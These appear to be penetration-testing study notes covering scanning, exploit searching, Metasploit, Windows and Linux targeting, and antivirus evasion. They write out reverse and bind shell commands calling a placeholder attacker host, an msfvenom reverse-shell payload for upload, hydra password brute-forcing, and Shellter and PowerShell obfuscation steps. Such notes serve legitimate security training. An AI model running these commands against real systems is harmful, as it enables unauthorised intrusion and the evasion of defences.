
---

### **1. Introduction to Exploitation**

- Exploitation involves tactics, techniques, and procedures used by attackers or penetration testers to gain initial access to a target system or network.
    
- Effective exploitation depends on solid information gathering and service enumeration.
    
- **Methodology:**
    
    1. Identify vulnerable services
        
    2. Search or prepare exploit code
        
    3. Gain system access
        
    4. Establish remote access
        
    5. Bypass AV detection
        
    6. Pivot to other systems
        

---

### **2. Vulnerability Scanning**

#### **Banner Grabbing**

- Used to collect information about the OS and running services.
    
- Techniques include:
    
    - Nmap version detection: `nmap -sV -O TargetIP`
        
    - Banner script: `nmap -sV --script=banner TargetIP`
        
    - Netcat: `nc TargetIP Port`
        
    - SSH login attempts: `ssh user@TargetIP`
        

#### **Nmap Script Scanning**

- Nmap scripts use Lua:
    
    ```
    nmap -sV --script=http-enum -p 80 TargetIP
    nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" TargetIP
    ```
    

#### **Metasploit Scanning**

- Already covered in the Metasploit section.
    

---

### **3. Exploits**

#### **Searching for Exploits**

- After identifying a vulnerability, search exploit code on:
    
    - Exploit-DB, Rapid7, GitHub, PacketStorm
        

#### **SearchSploit (Offline Search)**

- Comes pre-installed with Kali Linux.
    
    ```
    searchsploit ServiceName
    searchsploit -c ServiceName      # Case-sensitive
    searchsploit -t ServiceName      # Title search
    searchsploit -e ServiceName      # Exact match
    searchsploit remote windows smb -w | grep -e "EternalBlue"
    ```
    

#### **Fixing Exploits**

- Always review the exploit code to understand it and make necessary adjustments.
    

#### **Cross-Compiling Exploits**

- For Windows exploits written in C/C++:
    
    ```
    i686-w64-mingw32-gcc File.c -o OutputName -lws2_32
    gcc -pthread File.c -o OutputName -lcrypt
    ```
    

---

### **4. Bind & Reverse Shells**

#### **Netcat Basics**

- Netcat can be used for scanning, banner grabbing, file transfer, and remote shells.
    
    ```
    nc -nv TargetIP Port
    nc -lnvp Port
    nc -lnvp Port > output.txt
    nc -nv TargetIP < file.txt
    ```
    

#### **Bind Shells**

- Attacker connects to a listening shell on the victim:
    
    ```
    nc -lnvp Port -e cmd.exe
    nc -nv TargetIP Port
    ```
    

#### **Reverse Shells**

- Victim connects to the attacker's listener:
    
    ```
    nc -lnvp Port
    nc -nv AttackerIP Port -e /bin/bash
    ```
    
- **Resources:**
    
    - [https://www.revshells.com](https://www.revshells.com/)
        
    - [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
        

---

### **5. Exploitation Frameworks**

#### **Metasploit Framework**

- Example usage:
    
    ```
    msf6 > use exploit/multi/http/processmaker_exec
    ```
    

#### **PowerShell Empire**

- Framework for exploitation and post-exploitation on Windows.
    
- Starkiller is its GUI frontend: VueJS + Electron.
    

---

### **6. Windows Exploitation**

#### **Black Box Pentest**

- Attacker has no prior information.
    

#### **Port Scanning & Enumeration**

```bash
nmap -sV -p- -T4 -PA -sC TargetIP -oX output.xml
msf6 > db_import output.xml
msf6 > use auxiliary/scanner/smb/smb_version
```

#### **Targeting FTP (IIS)**

```bash
nmap -p 21 --script=ftp-anon TargetIP
hydra -L users.txt -P passwords.txt TargetIP ftp
msfvenom -p windows/shell/reverse_tcp LHOST=AttackerIP LPORT=Port -f asp > shell.aspx
ftp TargetIP
```

#### **Targeting SSH & SMB**

```bash
hydra -L users.txt -P passwords.txt TargetIP ssh
msf6 > use auxiliary/scanner/ssh/ssh_login
enu4linux -u user -p pass TargetIP
```

#### **Targeting MySQL**

```bash
msf6 > use auxiliary/scanner/mysql/mysql_login
mysql -u user -p -h TargetIP
```

---

### **7. Linux Exploitation**

#### **Linux Pentest Flow**

- Host discovery → Enumeration → Exploitation
    

#### **Port Scanning**

```bash
nmap -sV -p- -sC -T4 -PA TargetIP -O -oX output.xml
```

#### **vsFTPd / PHP / SAMBA**

```bash
searchsploit vsftpd
searchsploit -m ID
msf6 > use exploit/multi/samba/usermap_script
```

---

### **8. AV Evasion & Obfuscation**

#### **Shellter**

- On-disk evasion via encoding, packing, crypters
    
- Website: [https://www.shellterproject.com/homepage/](https://www.shellterproject.com/homepage/)
    

```bash
sudo apt install shellter wine32 -y
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```

#### **PowerShell Obfuscation**

- Tool: Invoke-Obfuscation
    
    - [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
        

```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTPATH /path/to/revshell
```

---
